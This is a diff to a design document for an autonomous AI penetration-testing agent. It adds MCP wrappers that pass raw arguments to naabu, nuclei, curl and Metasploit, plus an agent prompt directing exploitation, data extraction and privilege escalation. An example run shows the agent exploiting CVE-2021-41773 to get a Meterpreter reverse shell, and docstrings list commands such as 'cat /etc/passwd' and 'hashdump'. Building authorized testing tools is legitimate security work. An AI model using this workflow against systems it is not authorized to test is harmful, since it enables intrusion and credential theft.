@@ -76,13 +76,13 @@ An agentic AI system that autonomously performs penetration testing by leveragin
 
 ### How It Works
 
-1. **Agent decides** to call a tool (e.g., `naabu_scan("10.0.0.5")`)
+1. **Agent decides** to call a tool (e.g., `execute_naabu("-host 10.0.0.5 -p 1-1000 -json")`)
 2. **MCP Protocol** sends JSON-RPC request to the Kali container
-3. **MCP Server** (Python) receives request, executes `/usr/bin/naabu -host 10.0.0.5`
+3. **MCP Server** (Python) receives request, executes `/usr/bin/naabu -host 10.0.0.5 -p 1-1000 -json`
 4. **Tool output** is captured and returned to the agent via MCP
 5. **Agent reasons** about the result and decides next action
 
-The MCP servers are just **thin wrappers** that translate agent tool calls into CLI commands executed inside the Kali container where all tools are installed.
+The MCP servers are **thin wrappers** that translate agent tool calls into CLI commands executed inside the Kali container where all tools are installed. For maximum flexibility, naabu/nuclei/curl use dynamic command execution, while Metasploit uses structured tools due to its stateful nature.
 
 ---
 
@@ -178,141 +178,319 @@ volumes:
 
 ### 2. MCP Servers
 
-Each tool exposed as an MCP server with defined tool schemas.
+MCP servers expose penetration testing tools to the AI agent. We use two approaches:
+
+1. **Dynamic CLI Wrappers** (naabu, nuclei, curl): Generic `execute` + `help` tools that accept raw CLI arguments. This maximizes flexibility since LLMs know these tools from training data.
+
+2. **Structured Tools** (metasploit): Specific tools for each function because Metasploit is stateful (sessions, listeners) and benefits from explicit parameter handling.
+
+#### Tool Design Philosophy
+
+| Server | Approach | Rationale |
+|--------|----------|-----------|
+| naabu | Dynamic (`execute` + `help`) | Simple CLI, LLM knows flags |
+| nuclei | Dynamic (`execute` + `help`) | Many templates/options, flexible |
+| curl | Dynamic (`execute` + `help`) | Countless flags, LLM expertise |
+| metasploit | Structured (7 specific tools) | Stateful, sessions, complex workflows |
+
+---
 
 **mcp_servers/naabu_server.py:**
 ```python
-from mcp.server.fastmcp import FastMCP
+from fastmcp import FastMCP
 import subprocess
-import json
+import shlex
 
 mcp = FastMCP("naabu")
 
 @mcp.tool()
-def naabu_scan(target: str, ports: str = "1-1000", rate: int = 1000) -> str:
+def execute_naabu(args: str) -> str:
     """
-    Scan target for open ports using naabu.
+    Execute naabu port scanner with any valid CLI arguments.
 
     Args:
-        target: IP address or hostname to scan
-        ports: Port range (e.g., "1-1000", "80,443,8080")
-        rate: Packets per second
+        args: Command-line arguments for naabu (without the 'naabu' command itself)
 
     Returns:
-        JSON with discovered open ports
+        Command output (stdout + stderr combined)
+
+    Examples:
+        - "-host 10.0.0.5 -p 1-1000 -rate 1000 -json"
+        - "-host 192.168.1.0/24 -top-ports 100 -json"
+        - "-list targets.txt -p 22,80,443,8080 -json"
+        - "-host 10.0.0.5 -p 80,443 -nmap-cli 'nmap -sV'"
     """
-    cmd = ["naabu", "-host", target, "-p", ports, "-rate", str(rate), "-json"]
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    return result.stdout
+    try:
+        cmd_args = shlex.split(args)
+        result = subprocess.run(
+            ["naabu"] + cmd_args,
+            capture_output=True,
+            text=True,
+            timeout=300
+        )
+        output = result.stdout
+        if result.stderr:
+            output += f"\n[STDERR]: {result.stderr}"
+        return output
+    except subprocess.TimeoutExpired:
+        return "[ERROR] Command timed out after 300 seconds"
+    except Exception as e:
+        return f"[ERROR] {str(e)}"
+
+@mcp.tool()
+def naabu_help() -> str:
+    """
+    Get naabu help and usage information.
+    Use this to discover available flags and options.
+
+    Returns:
+        Naabu help output with all available options
+    """
+    result = subprocess.run(
+        ["naabu", "-help"],
+        capture_output=True,
+        text=True
+    )
+    return result.stdout + result.stderr
 
 if __name__ == "__main__":
     mcp.run(transport="stdio")
 ```
 
+---
+
 **mcp_servers/nuclei_server.py:**
 ```python
-from mcp.server.fastmcp import FastMCP
+from fastmcp import FastMCP
 import subprocess
+import shlex
 
 mcp = FastMCP("nuclei")
 
 @mcp.tool()
-def nuclei_scan(target: str, severity: str = "critical,high,medium") -> str:
+def execute_nuclei(args: str) -> str:
     """
-    Scan target for vulnerabilities using nuclei templates.
+    Execute nuclei vulnerability scanner with any valid CLI arguments.
 
     Args:
-        target: URL or IP to scan
-        severity: Comma-separated severity levels
+        args: Command-line arguments for nuclei (without the 'nuclei' command itself)
 
     Returns:
-        JSON with discovered vulnerabilities
+        Command output (stdout + stderr combined)
+
+    Examples:
+        - "-u http://10.0.0.5 -severity critical,high -jsonl"
+        - "-u http://10.0.0.5 -id CVE-2021-41773 -jsonl"
+        - "-u http://10.0.0.5 -tags cve,rce -jsonl"
+        - "-l urls.txt -severity critical -jsonl"
+        - "-u http://10.0.0.5 -t /path/to/template.yaml"
     """
-    cmd = ["nuclei", "-u", target, "-severity", severity, "-jsonl"]
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    return result.stdout
+    try:
+        cmd_args = shlex.split(args)
+        result = subprocess.run(
+            ["nuclei"] + cmd_args,
+            capture_output=True,
+            text=True,
+            timeout=600
+        )
+        output = result.stdout
+        if result.stderr:
+            output += f"\n[STDERR]: {result.stderr}"
+        return output
+    except subprocess.TimeoutExpired:
+        return "[ERROR] Command timed out after 600 seconds"
+    except Exception as e:
+        return f"[ERROR] {str(e)}"
 
 @mcp.tool()
-def nuclei_scan_cve(target: str, cve_id: str) -> str:
-    """Scan for a specific CVE."""
-    cmd = ["nuclei", "-u", target, "-id", cve_id, "-jsonl"]
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    return result.stdout
+def nuclei_help() -> str:
+    """
+    Get nuclei help and usage information.
+    Use this to discover available flags, template options, and severity levels.
+
+    Returns:
+        Nuclei help output with all available options
+    """
+    result = subprocess.run(
+        ["nuclei", "-help"],
+        capture_output=True,
+        text=True
+    )
+    return result.stdout + result.stderr
 
 if __name__ == "__main__":
     mcp.run(transport="stdio")
 ```
 
+---
+
 **mcp_servers/curl_server.py:**
 ```python
-from mcp.server.fastmcp import FastMCP
+from fastmcp import FastMCP
 import subprocess
+import shlex
 
 mcp = FastMCP("curl")
 
 @mcp.tool()
-def curl_request(url: str, method: str = "GET", headers: dict = None, data: str = None) -> str:
+def execute_curl(args: str) -> str:
     """
-    Make HTTP request using curl.
+    Execute curl HTTP client with any valid CLI arguments.
 
     Args:
-        url: Target URL
-        method: HTTP method (GET, POST, PUT, DELETE)
-        headers: Optional headers dict
-        data: Optional request body
+        args: Command-line arguments for curl (without the 'curl' command itself)
 
     Returns:
-        Response with headers and body
-    """
-    cmd = ["curl", "-s", "-i", "-X", method, url]
-    if headers:
-        for k, v in headers.items():
-            cmd.extend(["-H", f"{k}: {v}"])
-    if data:
-        cmd.extend(["-d", data])
+        Command output (stdout + stderr combined)
 
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    return result.stdout
+    Examples:
+        - "-s -i http://10.0.0.5/"
+        - "-s -X POST -H 'Content-Type: application/json' -d '{\"user\":\"admin\"}' http://10.0.0.5/api/login"
+        - "-s -I http://10.0.0.5/ -H 'User-Agent: Mozilla/5.0'"
+        - "-s -k https://10.0.0.5/ --connect-timeout 10"
+        - "-s -o /dev/null -w '%{http_code}' http://10.0.0.5/"
+    """
+    try:
+        cmd_args = shlex.split(args)
+        result = subprocess.run(
+            ["curl"] + cmd_args,
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+        output = result.stdout
+        if result.stderr:
+            output += f"\n[STDERR]: {result.stderr}"
+        return output
+    except subprocess.TimeoutExpired:
+        return "[ERROR] Command timed out after 60 seconds"
+    except Exception as e:
+        return f"[ERROR] {str(e)}"
+
+@mcp.tool()
+def curl_help() -> str:
+    """
+    Get curl help and usage information.
+    Use this to discover available flags and options.
+
+    Returns:
+        Curl help output with common options
+    """
+    result = subprocess.run(
+        ["curl", "--help", "all"],
+        capture_output=True,
+        text=True
+    )
+    return result.stdout + result.stderr
 
 if __name__ == "__main__":
     mcp.run(transport="stdio")
 ```
 
+---
+
 **mcp_servers/metasploit_server.py:**
+
+Metasploit uses structured tools because it's stateful (maintains sessions, listeners) and requires careful parameter handling for exploits.
+
 ```python
-from mcp.server.fastmcp import FastMCP
+from fastmcp import FastMCP
 import subprocess
-import json
+from typing import Optional
 
 mcp = FastMCP("metasploit")
 
 @mcp.tool()
 def metasploit_search(query: str) -> str:
-    """Search for exploits matching query."""
-    cmd = ["msfconsole", "-q", "-x", f"search {query}; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    return result.stdout
-
-@mcp.tool()
-def metasploit_info(module: str) -> str:
-    """Get detailed info about a module."""
-    cmd = ["msfconsole", "-q", "-x", f"info {module}; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    return result.stdout
-
-@mcp.tool()
-def metasploit_exploit(module: str, rhosts: str, rport: int,
-                       payload: str, lhost: str, lport: int) -> str:
     """
-    Execute an exploit with specified payload.
+    Search for Metasploit modules (exploits, payloads, auxiliaries).
 
     Args:
-        module: Exploit module path
-        rhosts: Target IP
-        rport: Target port
-        payload: Payload to deliver
-        lhost: Listener IP (attacker)
-        lport: Listener port
+        query: Search query (e.g., "struts", "CVE-2017-5638", "type:exploit platform:linux")
+
+    Returns:
+        List of matching modules with their ranks and descriptions
+
+    Examples:
+        - "apache struts"
+        - "CVE-2017-5638"
+        - "type:exploit platform:windows smb"
+        - "type:auxiliary scanner http"
+    """
+    cmd = ["msfconsole", "-q", "-x", f"search {query}; exit"]
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+    return result.stdout
+
+@mcp.tool()
+def metasploit_info(module_name: str) -> str:
+    """
+    Get detailed information about a Metasploit module.
+
+    Args:
+        module_name: Full module path (e.g., "exploit/multi/http/struts2_content_type_ognl")
+
+    Returns:
+        Module description, options, targets, and references
+    """
+    cmd = ["msfconsole", "-q", "-x", f"info {module_name}; exit"]
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+    return result.stdout
+
+@mcp.tool()
+def metasploit_module_payloads(module_name: str) -> str:
+    """
+    List compatible payloads for an exploit module.
+
+    Args:
+        module_name: Full exploit module path
+
+    Returns:
+        List of compatible payloads that can be used with this exploit
+    """
+    commands = f"use {module_name}; show payloads; exit"
+    cmd = ["msfconsole", "-q", "-x", commands]
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+    return result.stdout
+
+@mcp.tool()
+def metasploit_payload_info(payload_name: str) -> str:
+    """
+    Get detailed information about a payload.
+
+    Args:
+        payload_name: Full payload path (e.g., "linux/x64/meterpreter/reverse_tcp")
+
+    Returns:
+        Payload description, options (LHOST, LPORT, etc.), and platform info
+    """
+    cmd = ["msfconsole", "-q", "-x", f"info payload/{payload_name}; exit"]
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+    return result.stdout
+
+@mcp.tool()
+def metasploit_exploit(
+    module: str,
+    rhosts: str,
+    rport: int,
+    payload: str,
+    lhost: str,
+    lport: int,
+    extra_options: Optional[str] = None
+) -> str:
+    """
+    Execute a Metasploit exploit with specified payload.
+
+    Args:
+        module: Exploit module path (e.g., "multi/http/struts2_content_type_ognl")
+        rhosts: Target IP address or hostname
+        rport: Target port number
+        payload: Payload to deliver (e.g., "linux/x64/meterpreter/reverse_tcp")
+        lhost: Listener IP address (your attacking machine)
+        lport: Listener port number
+        extra_options: Additional options as "KEY=VALUE; KEY2=VALUE2" (optional)
+
+    Returns:
+        Exploit execution output including session info if successful
     """
     commands = f"""
 use {module}
@@ -321,26 +499,56 @@ set RPORT {rport}
 set PAYLOAD {payload}
 set LHOST {lhost}
 set LPORT {lport}
+"""
+    if extra_options:
+        for opt in extra_options.split(";"):
+            opt = opt.strip()
+            if opt:
+                commands += f"set {opt}\n"
+
+    commands += """
 exploit -j
-sessions
+sleep 5
+sessions -l
 exit
 """
     cmd = ["msfconsole", "-q", "-x", commands]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
     return result.stdout
 
 @mcp.tool()
 def metasploit_sessions() -> str:
-    """List active sessions."""
+    """
+    List all active Metasploit sessions.
+
+    Returns:
+        Table of active sessions with ID, type, connection info, and target details
+    """
     cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True)
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
     return result.stdout
 
 @mcp.tool()
-def metasploit_session_command(session_id: int, command: str) -> str:
-    """Execute command on an active session."""
+def metasploit_session_interact(session_id: int, command: str, timeout: int = 30) -> str:
+    """
+    Execute a command on an active Metasploit session.
+
+    Args:
+        session_id: Session ID from metasploit_sessions()
+        command: Command to execute (e.g., "whoami", "cat /etc/passwd", "sysinfo")
+        timeout: Command timeout in seconds (default: 30)
+
+    Returns:
+        Command output from the compromised target
+
+    Examples:
+        - session_id=1, command="whoami"
+        - session_id=1, command="cat /etc/passwd"
+        - session_id=1, command="sysinfo" (for meterpreter)
+        - session_id=1, command="hashdump" (for meterpreter with privileges)
+    """
     cmd = ["msfconsole", "-q", "-x", f"sessions -i {session_id} -c '{command}'; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)
     return result.stdout
 
 if __name__ == "__main__":
@@ -498,24 +706,36 @@ class PentestAgent:
 Your goal is to find and exploit vulnerabilities on the target system.
 
 You have access to these tools:
-- query_recon_data: Query Neo4j for existing recon data (hosts, ports, CVEs)
-- naabu_scan: Fast port scanning
-- curl_request: HTTP requests for enumeration
-- nuclei_scan: Vulnerability scanning with templates
-- metasploit_search: Find exploits for vulnerabilities
-- metasploit_info: Get exploit details
-- metasploit_exploit: Execute exploits
-- metasploit_sessions: List active sessions
-- metasploit_session_command: Run commands on compromised hosts
+
+**Reconnaissance & Scanning (Dynamic CLI):**
+- execute_naabu(args): Port scanning - pass any naabu CLI arguments
+- naabu_help(): Get naabu usage information
+- execute_nuclei(args): Vulnerability scanning - pass any nuclei CLI arguments
+- nuclei_help(): Get nuclei usage information
+- execute_curl(args): HTTP requests - pass any curl CLI arguments
+- curl_help(): Get curl usage information
+
+**Knowledge Base:**
+- query_recon_data(question): Query Neo4j for existing recon data (hosts, ports, CVEs)
+
+**Exploitation (Structured Tools):**
+- metasploit_search(query): Find exploits for vulnerabilities
+- metasploit_info(module_name): Get exploit module details
+- metasploit_module_payloads(module_name): List compatible payloads
+- metasploit_payload_info(payload_name): Get payload details
+- metasploit_exploit(module, rhosts, rport, payload, lhost, lport): Execute exploits
+- metasploit_sessions(): List active sessions
+- metasploit_session_interact(session_id, command): Run commands on compromised hosts
 
 Follow this methodology:
 1. PLANNING: Query recon data to understand the target infrastructure
-2. SCANNING: Use naabu to discover additional ports if needed
-3. ENUMERATION: Use curl and nuclei to find vulnerabilities
-4. EXPLOITATION: Use metasploit to exploit discovered vulnerabilities
-5. POST-EXPLOITATION: Extract data, escalate privileges
+2. SCANNING: Use execute_naabu to discover ports (e.g., "-host TARGET -p 1-1000 -json")
+3. ENUMERATION: Use execute_curl and execute_nuclei to find vulnerabilities
+4. EXPLOITATION: Use metasploit tools to exploit discovered vulnerabilities
+5. POST-EXPLOITATION: Use metasploit_session_interact to extract data, escalate privileges
 
 Always think step-by-step. Explain your reasoning before each action.
+If unsure about tool flags, use the _help tools to discover options.
 """
 
         messages = [{"role": "system", "content": system_prompt}] + state["messages"]
@@ -613,17 +833,28 @@ Step 1 - PLANNING
 └── Response: Host has ports 22, 80, 443 open. Running Apache 2.4.49.
               CVE-2021-41773 detected (Path Traversal, CVSS 7.5)
 
-Step 2 - ENUMERATION
+Step 2 - SCANNING (verify with fresh scan)
+├── Thought: Let me verify the open ports with a fresh scan
+├── Tool:    execute_naabu("-host 10.0.0.5 -p 1-1000 -json")
+└── Response: {"host":"10.0.0.5","port":22} {"host":"10.0.0.5","port":80} ...
+
+Step 3 - ENUMERATION
 ├── Thought: CVE-2021-41773 is a path traversal in Apache 2.4.49. Let me verify.
-├── Tool:    nuclei_scan(target="http://10.0.0.5", severity="critical,high")
+├── Tool:    execute_nuclei("-u http://10.0.0.5 -severity critical,high -jsonl")
 └── Response: [CVE-2021-41773] Apache 2.4.49 Path Traversal - CONFIRMED
 
-Step 3 - EXPLOITATION RESEARCH
+Step 4 - EXPLOITATION RESEARCH
 ├── Thought: Let me search for exploits for this CVE
 ├── Tool:    metasploit_search("CVE-2021-41773")
 └── Response: exploit/multi/http/apache_normalize_path_rce (Excellent)
 
-Step 4 - EXPLOITATION
+Step 5 - EXPLOITATION PREP
+├── Thought: Let me get info about this exploit and find compatible payloads
+├── Tool:    metasploit_info("exploit/multi/http/apache_normalize_path_rce")
+├── Tool:    metasploit_module_payloads("exploit/multi/http/apache_normalize_path_rce")
+└── Response: Compatible payloads: linux/x64/meterpreter/reverse_tcp, cmd/unix/reverse_bash...
+
+Step 6 - EXPLOITATION
 ├── Thought: Found an RCE exploit. Configuring and launching...
 ├── Tool:    metasploit_exploit(
 │                module="multi/http/apache_normalize_path_rce",
@@ -633,12 +864,12 @@ Step 4 - EXPLOITATION
 │            )
 └── Response: [*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:45892)
 
-Step 5 - POST-EXPLOITATION
+Step 7 - POST-EXPLOITATION
 ├── Thought: Shell obtained. Checking current user and extracting data.
-├── Tool:    metasploit_session_command(session_id=1, command="whoami")
+├── Tool:    metasploit_session_interact(session_id=1, command="whoami")
 └── Response: www-data
 
-Step 6 - REPORTING
+Step 8 - REPORTING
 └── Thought: Successfully exploited CVE-2021-41773 and obtained shell access as
              www-data. The target is vulnerable to path traversal leading to RCE.
 ```
